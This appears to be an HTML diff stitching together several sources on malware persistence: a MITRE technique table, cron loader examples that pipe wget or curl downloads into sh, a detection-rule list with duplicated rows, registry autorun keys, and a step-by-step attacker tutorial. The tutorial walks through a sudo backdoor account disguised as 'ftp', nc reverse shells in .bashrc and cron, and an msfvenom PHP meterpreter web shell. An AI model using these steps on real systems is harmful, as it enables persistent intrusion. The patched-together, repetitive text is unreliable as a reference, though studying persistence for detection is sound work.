+                <td>Scheduled Task/Job</td>
+                <td>Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time.</td>
+            </tr>
+            <tr>
+                <td>T1053.002</td>
+                <td>At</td>
+                <td>Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date.</td>
+            </tr>
+            <tr>
+                <td>T1053.003</td>
+                <td>Cron</td>
+                <td>Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code. The cron utility is a time-based job scheduler for Unix-like operating systems.</td>
+ <td colspan="3">
+        <p>The scheduled task in Cron is called a cron job. There are two main types of cron jobs: user-specific and system-wide.</p>
+        <p>User-specific cron jobs are typically located in:</p>
+        <ul>
+            <li>/var/spool/cron/</li>
+            <li>/var/spool/cron/crontabs/</li>
+        </ul>
+        <p>System-wide cron jobs can be found in:</p>
+        <ul>
+            <li>/etc/crontab</li>
+            <li>/etc/cron.d/</li>
+            <li>/etc/cron.daily/</li>
+            <li>/etc/cron.hourly/</li>
+            <li>/etc/cron.monthly/</li>
+            <li>/etc/cron.weekly/</li>
+        </ul>
+        <p>The syntax for cron jobs varies based on where the cron file is created. In system-wide cron files (e.g., /etc/cron.d/), the user must be specified:</p>
+        <pre>* * * * * root /bin/bash -c '/srv/backup_tool.sh'</pre>
+        <p>For user-specific cron files in /var/spool/cron/crontabs/, the user who created the file will execute the cron job:</p>
+        <pre>* * * * * /bin/bash -c '/srv/backup_tool.sh'</pre>
+        <p>The asterisks represent the following fields, in order: minutes, hours, days of the month, months, and days of the week. For example:</p>
+        <ul>
+            <li>* * * * *: Executes every minute.</li>
+            <li>* * 1 12 *: Executes every minute on the first day of December.</li>
+        </ul>
+        <p>Attackers can exploit cron jobs to execute scripts or binaries that establish reverse connections or add reverse shell commands, such as:</p>
+        <pre>* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/192.168.1.1/1337 0>&1'</pre>
+        <p>MITRE ATT&CK specifies more information and real-world examples related to this technique in T1053.003.</p>
+        <h4>Persistence through Cron Jobs (T1053.003)</h4>
+        <p>To create persistence through cron jobs, you can manually create a system-wide cron file in any of the /etc/ directories or use the <code>crontab -e</code> command to create a user-specific cron file. For demonstration, we will use a tool like PANIX, which simplifies the process.</p>
+        <pre>sudo ./panix.sh --cron --default --ip 192.168.1.1 --port 2001</pre>
+        <p>This creates a cron file at <code>/etc/cron.d/freedesktop_timesync1</code>, calling out to the attacker system every minute. Upon execution, the cron job connects back to the attacker, and network connections are established as shown:</p>
+        <img src="cron_persistence_events.png" alt="Events generated from cron persistence" />
+        <p>Elastic SIEM includes over 1,000 prebuilt rules, with more than 200 specifically for Linux, to help detect these techniques. The prevention capabilities include behavioral endpoint rules, memory/file signatures, and protection artifacts.</p>
+    </td>
+            </tr>
+            <tr>
+                <td>T1053.005</td>
+                <td>Scheduled Task</td>
+                <td>Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. Utilities such as schtasks can be used to schedule tasks, and some adversaries may leverage .NET wrappers or WMI to create tasks.</td>
+            </tr>
+            <tr>
+                <td>T1053.006</td>
+                <td>Systemd Timers</td>
+                <td>Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers can be used as an alternative to Cron in Linux environments and may be activated remotely.</td>
+            </tr>
+            <tr>
+                <td>T1053.007</td>
+                <td>Container Orchestration Job</td>
+                <td>Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code.</td>
+            </tr>
+            <tr>
+                <td>T1505</td>
+                <td>Server Software Component</td>
+                <td>Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications allow for software or scripts to be installed to extend functionality.</td>
+            </tr>
+            <tr>
+                <td>T1505.001</td>
+                <td>SQL Stored Procedures</td>
+                <td>Adversaries may abuse SQL stored procedures to establish persistent access to systems. Stored procedures can be invoked via SQL statements and may trigger specific actions on the database.</td>
+            </tr>
+            <tr>
+                <td>T1505.002</td>
+                <td>Transport Agent</td>
+                <td>Adversaries may abuse Microsoft transport agents to establish persistent access to systems. These agents can operate on email messages passing through the transport pipeline in Microsoft Exchange.</td>
+            </tr>
+            <tr>
+                <td>T1505.003</td>
+                <td>Web Shell</td>
+                <td>Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a script placed on a web server that allows adversaries to interact with the server remotely.</td>
+            </tr>
+            <tr>
+                <td>T1505.004</td>
+                <td>IIS Components</td>
+                <td>Adversaries may install malicious components on Internet Information Services (IIS) web servers to establish persistence. Extensions and filters can be used to modify web requests.</td>
+            </tr>
+            <tr>
+                <td>T1505.005</td>
+                <td>Terminal Services DLL</td>
+                <td>Adversaries may abuse components of Terminal Services to enable persistent access to systems. Terminal Services allow remote terminal connections to hosts via RDP.</td>
+            </tr>
+            <tr>
+                <td>T1205</td>
+                <td>Traffic Signaling</td>
+                <td>Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. This may involve methods such as port knocking.</td>
+            </tr>
+            <tr>
+                <td>T1205.001</td>
+                <td>Port Knocking</td>
+                <td>Adversaries may use port knocking to hide open ports. This involves sending a series of attempted connections to predefined closed ports, triggering the opening of a port.</td>
+            </tr>
+            <tr>
+                <td>T1205.002</td>
+                <td>Socket Filters</td>
+                <td>Adversaries may attach filters to network sockets to monitor and activate backdoors used for persistence. Filters may allow specific types of data to pass and trigger actions such as reverse shells.</td>
+            </tr>
+            <tr>
+                <td>T1078</td>
+                <td>Valid Accounts</td>
+                <td>Adversaries may obtain and abuse credentials of existing accounts as a means of gaining access, persistence, privilege escalation, or defense evasion. Compromised credentials may be used for remote access or to bypass security controls.</td>
+            </tr>
+            <tr>
+                <td>T1078.001</td>
+                <td>Default Accounts</td>
+                <td>Adversaries may obtain and abuse credentials of default accounts, such as the Administrator account on Windows systems or root accounts in other environments, for access or persistence.</td>
+            </tr>
+            <tr>
+                <td>T1078.002</td>
+                <td>Domain Accounts</td>
+                <td>Adversaries may obtain and abuse domain accounts for access and persistence within environments that use Active Directory Domain Services.</td>
+            </tr>
+            <tr>
+                <td>T1078.003</td>
+                <td>Local Accounts</td>
+                <td>Adversaries may obtain and abuse local accounts configured for specific systems or services, using those credentials to gain persistent access.</td>
+            </tr>
+            <tr>
+                <td>T1078.004</td>
+                <td>Cloud Accounts</td>
+                <td>Valid cloud accounts may be used by adversaries to perform actions like gaining access, persistence, privilege escalation, or evasion in cloud environments.</td>
+            </tr>
+            </tbody>
+        </table>
+    </div>
+   <h1>Malware Persistence via Cron Jobs and System Commands</h1>
+
+    <p>If malware is anything at all, it’s persistent. On Linux, just like Windows, malware once loaded wants to stay loaded. On Windows systems, this is usually done with a variety of registry mechanisms. For Linux, it’s often achieved using the <strong>crontab</strong> scheduling facility.</p>
+
+    <h2>The Cron Facility on Linux</h2>
+    <p>The cron facility on Linux mimics the Unix cron facility that has existed for decades. Essentially, as a user, you can instruct the computer to run a task on a periodic basis. This is typically used for maintenance scripts, backups, and other common automated tasks.</p>
+
+    <p>However, many system administrators don’t pay much attention to crontab (or its sister utility, “at”). As a result, malware has become adept at injecting itself into these areas to ensure it always remains on the host, even if you try to remove it. Attackers inject their commands into cron jobs, which then ensure their malware runs and stays up-to-date at regular intervals. If you don’t monitor these areas for signs of an intruder, you may be overlooking backdoors that allow attackers to re-enter at will.</p>
+
+    <h2>Malicious Cron Jobs Examples</h2>
+    <p>Recently, malware has taken advantage of simple system commands like <code>wget</code> and <code>curl</code> to pull over malicious code and updates. A common technique involves embedding a covert channel within a file that appears to be an ordinary <code>jpg</code> or <code>png</code> file. The file is actually a shell script designed to execute the malicious payload. Below are some examples of malicious cron jobs:</p>
+
+    <h3>Example 1: Simple Loader via Wget</h3>
+    <pre><code>*/11 * * * * wget -O - -q http://&lt;malicious_url&gt;/pics/logo.jpg | sh</code></pre>
+    <p>This example simply downloads a file that’s named like a JPG file, but it is actually a shell script that will be executed once downloaded.</p>
+
+    <h3>Example 2: Stealthy Payload via Curl</h3>
+    <pre><code>*/5 * * * * curl http://&lt;malicious_url&gt;/malicious.png -k | dd skip=2446 bs=1 | sh</code></pre>
+    <p>This second example is a more stealthy method. The file, which appears to be a <code>png</code> image, is actually a malicious payload. The <code>curl</code> command downloads it, while the <code>dd</code> command skips over 2446 bytes to reach the malicious payload and then runs it via the <code>sh</code> command. This method is more covert, as the file initially seems benign when inspected with common filesystem tools.</p>
+
+    <h2>The Importance of Regular Cron and At Job Audits</h2>
+    <p>One of the reasons we created <strong>Sandfly</strong> is to help administrators look in the corners of their systems for suspicious activity like this. Sandfly incorporates investigation modules that continuously check your cron and at jobs for malware persistence and other threats.</p>
+
+    <p>When was the last time you checked your cron and at jobs to ensure they looked legitimate? Often, administrators don’t perform these checks frequently enough. Sandfly can automate this process, monitoring your system throughout the day and providing you with detailed information about any potential issues found.</p>
+
+    <p>Below are some examples of malicious cron and at jobs, demonstrating how <strong>Sandfly’s agentless security technology</strong> makes finding suspicious activity quick, automated, and reliable.</p>
+   <h2>Techniques for Linux Malware Persistence</h2>
+    <p>Below is a table listing various techniques used by attackers for persistence on Linux systems:</p>
+
+    <table>
+        <thead>
+            <tr>
+                <th>Technique</th>
+                <th>Type</th>
+                <th>Sub-Type</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>Linux Add Files In Known Crontab Directories</td>
+                <td>Cron</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Add User Account</td>
+                <td>Local Account</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Adding Crontab Using List Parameter</td>
+                <td>Cron</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux At Allow Config File Creation</td>
+                <td>Cron</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux At Application Execution</td>
+                <td>At</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Add User Account</td>
+                <td>Local Account</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Add User Account Type</td>
+                <td>Local Account</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd At Application Execution</td>
+                <td>At</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Auditd Service Stop</td>
+                <td>Service Stop</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Base64 Decode Files</td>
+                <td>Deobfuscate/Decode Files or Information</td>
+                <td></td>
+            </tr>
+            <!-- Continue adding rows for all the other techniques -->
+  <tr>
+                <td>Linux Add Files In Known Crontab Directories</td>
+                <td>Cron</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Add User Account</td>
+                <td>Local Account</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Adding Crontab Using List Parameter</td>
+                <td>Cron</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux At Allow Config File Creation</td>
+                <td>Cron</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux At Application Execution</td>
+                <td>At</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Add User Account</td>
+                <td>Local Account</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Change File Owner To Root</td>
+                <td>Linux and Mac File and Directory Permissions Modification</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Data Transfer Size Limits Via Split</td>
+                <td>Data Transfer Size Limits</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Data Transfer Size Limits Via Split Syscall</td>
+                <td>Data Transfer Size Limits</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Database File And Directory Discovery</td>
+                <td>File and Directory Discovery</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Disable Or Modify System Firewall</td>
+                <td>Disable or Modify System Firewall</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Doas Conf File Creation</td>
+                <td>Sudo and Sudo Caching</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Doas Tool Execution</td>
+                <td>Sudo and Sudo Caching</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Edit Cron Table Parameter</td>
+                <td>Cron</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd File And Directory Discovery</td>
+                <td>File and Directory Discovery</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd File Permission Modification Via Chmod</td>
+                <td>Linux and Mac File and Directory Permissions Modification</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd File Permissions Modification Via Chattr</td>
+                <td>Linux and Mac File and Directory Permissions Modification</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Find Credentials From Password Managers</td>
+                <td>Password Managers</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Find Credentials From Password Stores</td>
+                <td>Password Managers</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Find Ssh Private Keys</td>
+                <td>Private Keys</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Hidden Files And Directories Creation</td>
+                <td>File and Directory Discovery</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Insert Kernel Module Using Insmod Utility</td>
+                <td>Kernel Modules and Extensions</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Install Kernel Module Using Modprobe Utility</td>
+                <td>Kernel Modules and Extensions</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Kernel Module Using Rmmod Utility</td>
+                <td>Kernel Modules and Extensions</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Nopasswd Entry In Sudoers File</td>
+                <td>Sudo and Sudo Caching</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Osquery Service Stop</td>
+                <td>Service Stop</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Possible Access Or Modification Of Sshd Config File</td>
+                <td>SSH Authorized Keys</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Possible Access To Credential Files</td>
+                <td>/etc/passwd and /etc/shadow</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Possible Access To Sudoers File</td>
+                <td>Sudo and Sudo Caching</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Possible Append Cronjob Entry On Existing Cronjob File</td>
+                <td>Cron</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Preload Hijack Library Calls</td>
+                <td>Dynamic Linker Hijacking</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Preload Hijack Via Preload File</td>
+                <td>Dynamic Linker Hijacking</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Private Keys and Certificate Enumeration</td>
+                <td>Private Keys</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Service Restarted</td>
+                <td>Systemd Timers</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Service Started</td>
+                <td>Service Execution</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Setuid Using Chmod Utility</td>
+                <td>Setuid and Setgid</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Setuid Using Setcap Utility</td>
+                <td>Setuid and Setgid</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Shred Overwrite Command</td>
+                <td>Data Destruction</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Sudo Or Su Execution</td>
+                <td>Sudo and Sudo Caching</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Sysmon Service Stop</td>
+                <td>Service Stop</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd System Network Configuration Discovery</td>
+                <td>System Network Configuration Discovery</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Unix Shell Configuration Modification</td>
+                <td>Unix Shell Configuration Modification</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Unload Module Via Modprobe</td>
+                <td>Kernel Modules and Extensions</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Virtual Disk File And Directory Discovery</td>
+                <td>File and Directory Discovery</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Auditd Whoami User Discovery</td>
+                <td>System Owner/User Discovery</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Change File Owner To Root</td>
+                <td>Linux and Mac File and Directory Permissions Modification</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Common Process For Elevation Control</td>
+                <td>Setuid and Setgid</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Doas Conf File Creation</td>
+                <td>Sudo and Sudo Caching</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Doas Tool Execution</td>
+                <td>Sudo and Sudo Caching</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Edit Cron Table Parameter</td>
+                <td>Cron</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux File Created In Kernel Driver Directory</td>
+                <td>Kernel Modules and Extensions</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux File Creation In Init Boot Directory</td>
+                <td>RC Scripts</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux File Creation In Profile Directory</td>
+                <td>Unix Shell Configuration Modification</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Insert Kernel Module Using Insmod Utility</td>
+                <td>Kernel Modules and Extensions</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Install Kernel Module Using Modprobe Utility</td>
+                <td>Kernel Modules and Extensions</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux NOPASSWD Entry In Sudoers File</td>
+                <td>Sudo and Sudo Caching</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Possible Access Or Modification Of sshd Config File</td>
+                <td>SSH Authorized Keys</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Possible Access To Credential Files</td>
+                <td>/etc/passwd and /etc/shadow</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Possible Access To Sudoers File</td>
+                <td>Sudo and Sudo Caching</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Possible Append Command To At Allow Config File</td>
+                <td>At</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Possible Append Command To Profile Config File</td>
+                <td>Unix Shell Configuration Modification</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Possible Append Cronjob Entry on Existing Cronjob File</td>
+                <td>Cron</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Possible Cronjob Modification With Editor</td>
+                <td>Cron</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Possible Ssh Key File Creation</td>
+                <td>SSH Authorized Keys</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Preload Hijack Library Calls</td>
+                <td>Dynamic Linker Hijacking</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Service File Created In Systemd Directory</td>
+                <td>Systemd Timers</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Service Restarted</td>
+                <td>Systemd Timers</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Service Started Or Enabled</td>
+                <td>Systemd Timers</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Setuid Using Chmod Utility</td>
+                <td>Setuid and Setgid</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Setuid Using Setcap Utility</td>
+                <td>Setuid and Setgid</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Shred Overwrite Command</td>
+                <td>Data Destruction</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Sudo OR Su Execution</td>
+                <td>Sudo and Sudo Caching</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Sudoers Tmp File Creation</td>
+                <td>Sudo and Sudo Caching</td>
+                <td></td>
+            </tr>
+            <tr>
+                <td>Linux Visudo Utility Execution</td>
+                <td>Sudo and Sudo Caching</td>
+                <td></td>
+            </tr>
+
+        </tbody>
+    </table>
+<section id="persistence-techniques">
+    <h2>Persistence Techniques on Linux</h2>
+    <p>Our objective is to establish persistence on the Linux target after we have obtained an initial foothold. Some persistence techniques will require “root” privileges in order to be executed successfully.</p>
+
+    <h3>Persistence via SSH Keys</h3>
+    <p>The first persistence technique we will be exploiting is the process of generating and using SSH key-based authentication. This will help maintain access to the target system if the user account passwords are changed. This is common in environments where password security policies are enforced.</p>
+    <p><strong>Note:</strong> This technique requires Public Key Authentication to be enabled in the SSH configuration file. More details on how to add SSH keys can be found <a href="https://www.ssh.com/ssh/keygen/">here</a>.</p>
+    
+    <p>Steps to achieve persistence via SSH keys:</p>
+    <ol>
+        <li><strong>Generate an SSH key pair:</strong> On your Kali VM, run:
+            <pre>ssh-keygen</pre>
+        </li>
+        <li><strong>Copy the public key:</strong> Copy the content of the public key (id_rsa.pub) and add it to the authorized_keys file in the target user account’s .ssh directory on the target system.
+            <pre>mkdir ~/.ssh && touch ~/.ssh/authorized_keys</pre>
+        </li>
+        <li><strong>Set proper permissions:</strong>
+            <pre>chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys</pre>
+        </li>
+        <li>Now you can authenticate to the target via SSH without needing a password.</li>
+    </ol>
+
+    <h3>Creating a Privileged Local Account</h3>
+    <p>This technique involves creating a local privileged user account that can be used for backdoor access, even if the user password is changed. It's important to create a username that blends in, for example, naming the user account “ftp” to avoid detection.</p>
+    
+    <p><strong>Note:</strong> You will need root privileges to create a new user account.</p>
+    
+    <p>Steps to create a privileged local account:</p>
+    <ol>
+        <li><strong>Create a new user:</strong>
+            <pre>useradd -m -s /bin/bash ftp</pre>
+        </li>
+        <li><strong>Add the user to the sudo group:</strong>
+            <pre>usermod -aG sudo ftp</pre>
+        </li>
+        <li><strong>Set a password for the new user:</strong>
+            <pre>passwd ftp</pre>
+        </li>
+        <li><strong>Confirm the new account:</strong>
+            <pre>cat /etc/passwd</pre>
+        </li>
+        <li>Test the account with sudo commands to confirm administrative privileges:</li>
+        <pre>sudo apt update</pre>
+    </ol>
+
+    <h3>Unix Shell Configuration Modification</h3>
+    <p>In this technique, we will add a reverse shell command to the .bashrc file in the user's home directory. The .bashrc file is executed each time the user logs in, so we can insert a command that connects back to our listener, providing persistent access.</p>
+    
+    <p>Steps for Unix shell configuration modification:</p>
+    <ol>
+        <li><strong>Edit the .bashrc file:</strong>
+            <pre>nano ~/.bashrc</pre>
+        </li>
+        <li><strong>Add the reverse shell command:</strong>
+            <pre>nc -e /bin/bash <KALI-IP> <PORT> 2>/dev/null &</pre>
+        </li>
+        <li><strong>Set up a listener on Kali:</strong>
+            <pre>nc -nvlp <PORT></pre>
+        </li>
+        <li>When the user logs in, the reverse shell will be triggered, giving you access.</li>
+    </ol>
+
+    <h3>Persistence via Web Shell</h3>
+    <p>This technique involves uploading a PHP web shell to the target server. Since the target is running a LAMP stack, we can create a PHP meterpreter payload and upload it as a backdoor.</p>
+    
+    <p>Steps for persistence via a web shell:</p>
+    <ol>
+        <li><strong>Generate a PHP Meterpreter payload:</strong>
+            <pre>msfvenom -p php/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> -e php/base64 -f raw > backup.php</pre>
+        </li>
+        <li><strong>Modify the file:</strong> Add PHP tags to the generated payload and save it as "backup.php".</li>
+        <li><strong>Set up the Metasploit listener:</strong>
+            <pre>msfconsole
+            use multi/handler
+            set payload php/meterpreter/reverse_tcp
+            set LHOST <KALI-IP>
+            set LPORT <PORT>
+            run</pre>
+        </li>
+        <li><strong>Upload the payload to the web server:</strong>
+            <pre>wget http://<KALI-IP>/backup.php</pre>
+        </li>
+        <li>Access the web shell by visiting <code>http://<SERVER-IP>/backup.php</code> in the browser, which will trigger a meterpreter session.</li>
+    </ol>
+
+    <h3>Persistence via Cron Jobs</h3>
+    <p>This technique uses Cron jobs to execute commands at scheduled intervals. By creating a Cron job to execute a reverse shell or a web shell periodically, we can maintain persistent access to the system.</p>
+    
+    <p>Steps for persistence via Cron jobs:</p>
+    <ol>
+        <li><strong>Edit the crontab file:</strong>
+            <pre>crontab -e</pre>
+        </li>
+        <li><strong>Set up the cron job:</strong>
+            <pre>* * * * * nc <KALI-IP> <PORT> -e /bin/sh</pre>
+        </li>
+        <li><strong>Set up a listener on Kali:</strong>
+            <pre>nc -nvlp <PORT></pre>
+        </li>
+        <li>After one minute, the cron job will execute and provide a reverse shell connection.</li>
+    </ol>
+
+    <p>Alternatively, you can run the PHP Meterpreter payload using Cron jobs:</p>
+    <pre>* * * * * php -f /var/www/html/backup.php</pre>
+    <p>After one minute, a meterpreter session will be established.</p>
+
+</section>
+<section id="windows-persistence">
+    <h2>Windows Persistence via Registry Key Modifications</h2>
+    <p>Malware often utilizes modifications to Windows registry keys to achieve persistence on a system. Below are some of the most common registry values and locations that malware may exploit to maintain persistence:</p>
+
+    <h3>Run/RunOnce Keys</h3>
+    <p>Windows provides various AutoStart Extension Points (ASEPs) to manage programs that should start automatically. Many types of malware utilize the following registry keys to execute on system startup:</p>
+    <ul>
+        <li>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</li>
+        <li>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</li>
+    </ul>
+    <p>These keys operate at the user level and are commonly exploited by malware to achieve persistence if it is unable to obtain administrator or system-level privileges.</p>
+
+    <p>At the system level, the following keys are targeted:</p>
+    <ul>
+        <li>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</li>
+        <li>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</li>
+        <li>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</li>
+    </ul>
+
+    <h3>BootExecute Key</h3>
+    <p>The <code>BootExecute</code> key is a particularly significant location because it controls what executes before the Windows subsystem fully loads. The <code>smss.exe</code> process, which runs early in Windows startup, will check and execute entries in the BootExecute key located at:</p>
+    <pre>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager\BootExecute</pre>
+    <p>This key should always have the default value <code>autocheck autochk*</code>. If additional values are present, it is possible that malware is scheduled to run at boot.</p>
+
+    <h3>Keys Used by WinLogon Process</h3>
+    <p>The WinLogon process is essential for managing user logons, and certain registry keys can be modified to ensure malicious executables are run during logon:</p>
+
+    <ul>
+        <li><strong>Userinit Key:</strong> This key specifies the executable that WinLogon runs when a user logs in. It is located at:</li>
+        <pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</pre>
+        <p>By default, it points to <code>userinit.exe</code>. If this key is altered, malicious executables can be run during the login process.</p>
+
+        <li><strong>Notify Subkeys:</strong> WinLogon also uses the <code>Notify</code> subkeys to load DLLs when Secure Attention Sequence (SAS, like Ctrl+Alt+Del) occurs. These are located at:</li>
+        <pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify</pre>
+
+        <li><strong>Explorer.exe Key:</strong> The registry key at <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> points to <code>explorer.exe</code>, which should only contain the string <code>explorer.exe</code>. If modified, it could execute other malicious files.</li>
+    </ul>
+
+    <h3>Startup Keys</h3>
+    <p>Malware can also place malicious files in startup locations, making them run automatically on logon or reboot. These startup locations are controlled via registry keys:</p>
+    <ul>
+        <li>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</li>
+        <li>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</li>
+        <li>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</li>
+        <li>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</li>
+    </ul>
+
+    <h3>Windows Services</h3>
+    <p>Many Windows services, such as the Workstation and Windows Event Log services, are required to run at boot. Malware can place malicious files in the following registry keys to ensure the files are executed when these services start:</p>
+    <ul>
+        <li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services</li>
+        <li>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</li>
+        <li>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</li>
+    </ul>
+
+    <h3>Browser Helper Objects (BHO)</h3>
+    <p>Browser Helper Objects are DLL modules that load when Internet Explorer starts. They can be exploited by malware for data theft and other malicious activities. These are located at:</p>
+    <pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</pre>
+
+    <h3>AppInit_DLLs</h3>
+    <p>This registry key points to DLLs that are loaded by <code>User32.dll</code> during the Windows login process. Malware often places malicious DLLs here to ensure they are loaded when any executable runs:</p>
+    <pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</pre>
+
+    <h3>File Association Keys</h3>
+    <p>File association keys in the registry control what happens when a certain file type is opened. Malware may exploit these keys to ensure its malicious files are opened with certain file types:</p>
